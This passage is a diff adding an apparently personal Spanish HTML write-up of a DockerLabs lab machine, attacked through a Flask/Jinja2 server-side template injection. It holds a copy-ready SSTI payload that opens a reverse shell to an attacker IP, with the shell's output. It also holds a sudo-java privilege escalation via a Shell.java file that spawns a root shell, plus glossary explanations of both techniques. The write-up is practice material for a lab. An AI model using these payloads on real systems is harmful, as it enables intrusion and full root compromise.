+          <em>PinguNombre</em> y enviamos el formulario.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd='{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('"'"'bash -c "sh -i >& /dev/tcp/192.168.111.128/4444 0>&1"'"'"').read() }}'>
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">REVSHELL SSTI</span>
+        <div><span class="ssti">{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "sh -i &gt;&amp; /dev/tcp/192.168.111.128/4444 0&gt;&amp;1"').read() }}</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">connect to [192.168.111.128] from (UNKNOWN) [172.17.0.2] 37382</span></div>
+        <div>sh: 0: can't access tty; job control turned off</div>
+        <div><span class="o-green">$ whoami</span></div>
+        <div><span class="o-green">pinguinazo</span></div>
+        <div><span class="o-green">$ ls</span></div>
+        <div>flask_ssti_lab</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>La shell que obtenemos es básica (sin TTY completo). Para mejorarla podemos usar:
+        <strong>python3 -c 'import pty; pty.spawn("/bin/bash")'</strong> seguido de Ctrl+Z,
+        <strong>stty raw -echo; fg</strong> y luego <strong>export TERM=xterm</strong>.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- PRIVESC -->
+    <div class="section" id="privesc">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Escalada de Privilegios — sudo Java</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">9</div>
+        <span class="step-title">ENUMERAR PERMISOS SUDO</span>
+      </div>
+      <div class="prose">
+        <p>
+          Ejecutamos <code style="color:var(--green)">sudo -l</code> para listar qué comandos
+          puede ejecutar el usuario <span class="hl">pinguinazo</span> como root sin contraseña.
+          El resultado es contundente: puede ejecutar <span class="hl">/usr/bin/java</span>
+          como cualquier usuario con <strong>NOPASSWD</strong>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo -l">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SUDO -L</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo <span class="flag">-l</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Matching Defaults entries for pinguinazo on 18f5ddaaf0af:</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;env_reset, mail_badpass,</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;use_pty</div>
+        <div>&nbsp;</div>
+        <div>User pinguinazo may run the following commands on 18f5ddaaf0af:</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;(ALL) NOPASSWD: <span class="o-green">/usr/bin/java</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">10</div>
+        <span class="step-title">CREAR Y COMPILAR SHELL.JAVA (GTFObins)</span>
+      </div>
+      <div class="prose">
+        <p>
+          Siguiendo la técnica de <strong>GTFObins</strong> para Java con Sudo, creamos un
+          programa Java mínimo que usa <code style="color:var(--green)">ProcessBuilder</code>
+          para lanzar <code style="color:var(--green)">/bin/sh</code> heredando los
+          file descriptors del proceso padre. Al ejecutarlo con <code style="color:var(--green)">sudo</code>,
+          la shell hereda los privilegios de <span class="hl-red">root</span>.
+        </p>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// ATENCIÓN — CASE SENSITIVE</p>
+        <p>Java distingue mayúsculas: el archivo debe llamarse <strong>Shell.java</strong> (con S mayúscula)
+        y ejecutarse como <strong>sudo java Shell</strong> (no <strong>shell</strong>).
+        Un error común es escribir <strong>sudo java shell</strong> que resulta en
+        <em>ClassNotFoundException: shell</em>.</p>
+      </div>
+
+      <div class="cmd-block" data-cmd="cat >Shell.java <<EOF
+public class Shell {
+  public static void main(String[] args) throws Exception {
+    new ProcessBuilder(&quot;/bin/sh&quot;).inheritIO().start().waitFor();
+  }
+}
+EOF">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">CREAR Shell.java</span>
+        <div><span class="prompt">$ </span><span class="cmd">cat &gt;Shell.java &lt;&lt;EOF</span></div>
+        <div><span class="arg">public class Shell {</span></div>
+        <div><span class="arg">&nbsp;&nbsp;public static void main(String[] args) throws Exception {</span></div>
+        <div><span class="arg">&nbsp;&nbsp;&nbsp;&nbsp;new ProcessBuilder("/bin/sh").inheritIO().start().waitFor();</span></div>
+        <div><span class="arg">&nbsp;&nbsp;}</span></div>
+        <div><span class="arg">}</span></div>
+        <div><span class="cmd">EOF</span></div>
+      </div>
+
+      <div class="cmd-block" data-cmd="javac Shell.java">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">COMPILAR</span>
+        <div><span class="prompt">$ </span><span class="cmd">javac <span class="arg">Shell.java</span></span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">11</div>
+        <span class="step-title">EJECUTAR CON SUDO → ROOT</span>
+      </div>
+      <div class="prose">
+        <p>
+          Ejecutamos el programa compilado con <code style="color:var(--green)">sudo java Shell</code>.
+          El proceso Java arranca <code style="color:var(--green)">/bin/sh</code> con UID efectivo de
+          <span class="hl-red">root</span> gracias al permiso sudo. Verificamos con
+          <code style="color:var(--green)">whoami</code>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo java Shell">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PRIVESC</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo java <span class="arg">Shell</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="prompt-root">$ </span>whoami</div>
+        <div><span class="o-red">root</span></div>
+        <div><span class="prompt-root"># </span>id</div>
+        <div><span class="o-red">uid=0(root) gid=0(root) groups=0(root)</span></div>
+      </div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// MÁQUINA COMPROMETIDA</p>
+        <p>Acceso root obtenido. Cadena completa: <strong>SSTI Jinja2 → RCE → reverse shell pinguinazo → sudo java Shell → root</strong>.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REFERENCIA -->
+    <div class="section" id="referencia">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nmap</div>
+          <div class="cmd-ref-syntax">nmap [flags] &lt;target&gt;</div>
+          <div class="cmd-ref-desc">Escáner de red y puertos. Detecta servicios, versiones y ejecuta scripts NSE.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-p-</span> — todos los 65535 puertos</li>
+            <li><span>-sSCV</span> — SYN scan + versión + scripts</li>
+            <li><span>-n</span> — sin resolución DNS</li>
+            <li><span>-Pn</span> — no ping previo (asumir host activo)</li>
+            <li><span>--min-rate=5000</span> — mínimo 5000 paquetes/seg</li>
+            <li><span>--open</span> — solo puertos abiertos</li>
+            <li><span>-oX</span> — output en formato XML</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nc (netcat)</div>
+          <div class="cmd-ref-syntax">nc -nlvp &lt;port&gt;</div>
+          <div class="cmd-ref-desc">Swiss army knife de redes. En modo listener recibe conexiones entrantes (reverse shells).</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-n</span> — sin resolución DNS</li>
+            <li><span>-l</span> — modo listener</li>
+            <li><span>-v</span> — verbose (mostrar conexiones)</li>
+            <li><span>-p</span> — especificar puerto</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">sudo</div>
+          <div class="cmd-ref-syntax">sudo [opciones] &lt;comando&gt;</div>
+          <div class="cmd-ref-desc">Ejecuta comandos con privilegios de otro usuario (por defecto root).</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-l</span> — listar comandos permitidos</li>
+            <li><span>-u user</span> — ejecutar como usuario específico</li>
+            <li><span>NOPASSWD</span> — sin solicitar contraseña</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">javac / java</div>
+          <div class="cmd-ref-syntax">javac Shell.java &amp;&amp; java Shell</div>
+          <div class="cmd-ref-desc">Compilador e intérprete de Java. Compilar genera Shell.class que luego ejecuta la JVM.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>javac</span> — compila .java → .class</li>
+            <li><span>java</span> — ejecuta el bytecode</li>
+            <li><span>ProcessBuilder</span> — spawna procesos hijos</li>
+            <li><span>inheritIO()</span> — hereda stdin/stdout/stderr</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- GLOSARIO -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">SSTI — Server-Side Template Injection</div>
+          <div class="glos-def"><strong>Server-Side Template Injection</strong> ocurre cuando una aplicación web embebe directamente la entrada del usuario dentro de una plantilla que es procesada por el servidor, en lugar de pasar los datos como argumentos al motor de plantillas. En <strong>Jinja2</strong> (Python/Flask), las expresiones entre <code>{{ }}</code> son evaluadas como código Python. Si el input del usuario se concatena al template string antes de renderizarlo, el atacante puede ejecutar código arbitrario. La detección clásica es inyectar <code>{{"{{"}}7*7{{"}}"}}</code> — si la respuesta contiene <strong>49</strong>, hay SSTI. La explotación va de lectura de variables de entorno hasta RCE completo.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Jinja2 — Motor de Plantillas Python</div>
+          <div class="glos-def"><strong>Jinja2</strong> es el motor de plantillas por defecto de Flask. Permite generar HTML dinámico usando variables (<code>{{ variable }}</code>), estructuras de control (<code>{% if %}{% for %}</code>) y filtros. El objeto <strong>self._TemplateReference__context</strong> es una referencia interna al contexto de la plantilla. A través de él se puede acceder a objetos globales como <code>cycler</code>, <code>joiner</code> o <code>namespace</code>, cuyos métodos <code>__init__</code> tienen acceso a <code>__globals__</code> que incluye el módulo <code>os</code>, permitiendo llamar a <code>os.popen()</code> para ejecutar comandos del sistema.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Werkzeug — Servidor WSGI de Desarrollo</div>
+          <div class="glos-def"><strong>Werkzeug</strong> es la librería WSGI subyacente de Flask, que incluye un servidor de desarrollo integrado. Cuando se detecta en producción (como en esta máquina), indica una mala práctica de deployment. En modo debug, Werkzeug expone un debugger interactivo en el navegador que permite ejecutar código Python directamente sin necesidad de SSTI. La versión 3.0.1 con Python 3.12.3 vista en el escaneo Nmap confirma el stack tecnológico.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Reverse Shell — Shell Inversa</div>
+          <div class="glos-def">Una <strong>reverse shell</strong> es una técnica donde el sistema comprometido inicia la conexión hacia el atacante (en lugar del atacante conectarse al objetivo). Esto evita firewalls que bloquean conexiones entrantes. El comando <code>sh -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code> redirige stdin, stdout y stderr de una shell interactiva a través de un socket TCP hacia la máquina atacante. El atacante escucha con <code>nc -nlvp PORT</code> y recibe la shell cuando el payload se ejecuta.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">GTFObins — Java con Sudo</div>
+          <div class="glos-def"><strong>GTFObins</strong> documenta que <code>java</code> puede escalar privilegios cuando se ejecuta via sudo. La técnica consiste en compilar una clase Java que use <code>ProcessBuilder("/bin/sh").inheritIO().start().waitFor()</code>. Al llamar a <code>sudo java Shell</code>, la JVM arranca como root y el <code>ProcessBuilder</code> spawna una <code>/bin/sh</code> que hereda el contexto de root mediante <code>inheritIO()</code>. El truco de <code>inheritIO()</code> es que conecta automáticamente el stdin/stdout/stderr del proceso hijo con los del proceso padre (la JVM corriendo como root), dándonos una shell interactiva root sin más configuración.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">DockerLabs — Plataforma de Laboratorios</div>
+          <div class="glos-def"><strong>DockerLabs</strong> es una plataforma de hacking ético gratuita que usa contenedores Docker como máquinas vulnerables. Se ejecuta localmente sin necesidad de VPN, con IPs siempre en el rango <code>172.17.0.0/16</code>. El despliegue es instantáneo con <code>auto_deploy.sh</code> y la eliminación también: solo Ctrl+C. Ideal para practicar sin límites de tiempo ni instancias concurrentes.</div>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · DockerLabs</p>
+  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+
+<script>
+  // TOC ACTIVE
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObs = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObs.observe(s));
+
+  // CURSOR
+  const cursor = document.getElementById('cursor');
+  const ring   = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
+    cursor.style.opacity = '1'; ring.style.opacity = '0.5';
+  });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup',   () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const scrolled = document.documentElement.scrollTop;
+    const height   = document.documentElement.scrollHeight - window.innerHeight;
+    const pct = height > 0 ? (scrolled / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = pct + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) { toast = document.createElement('div'); toast.className = 'toast'; document.body.appendChild(toast); }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY CMD
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK'; btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1800);
+    }).catch(() => showToast('Error al copiar'));
+  }
+</script>
+</body>
+</html>
